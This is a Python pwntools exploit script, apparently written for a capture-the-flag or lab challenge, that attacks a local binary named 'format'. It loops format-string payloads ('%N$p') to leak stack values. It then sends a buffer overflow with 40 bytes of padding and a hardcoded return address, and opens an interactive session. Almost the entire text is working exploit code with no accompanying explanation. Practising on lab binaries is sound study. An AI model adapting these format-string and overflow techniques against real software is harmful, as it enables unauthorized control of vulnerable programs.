from pwn import *

bpath = "./format"
elf = ELF(bpath)
context.binary = elf
context.log_level = 'debug'


def leak(param_num):
    p = process(bpath)
    p.recvline()
    p.sendline(f"%{param_num}$p")
    leak_raw = p.recvline().strip()
    leak_value = int(leak_raw, 16)
    p.sendline(b'_')
    p.wait()
    return leak_value


for i in range(0,16):
    try:
        with context.silent:
            leak_val = leak(i)
        log.info(f"Value leaked at param {i}: {hex(leak_val)}")
    except Exception as e:
        log.info(f"Failed to leak value for param num {i}")
        print(e)


#p = gdb.debug(bpath,'''
#        break *calibrate+76
#        ''')
p = process(bpath)
p.recvline()
#p.sendline(b'a'*47+p64(0x555a8035c229))
p.sendline(b'a')
p.sendline(b'a'*40+p64(0x555555555229))
p.interactive()
p.wait()
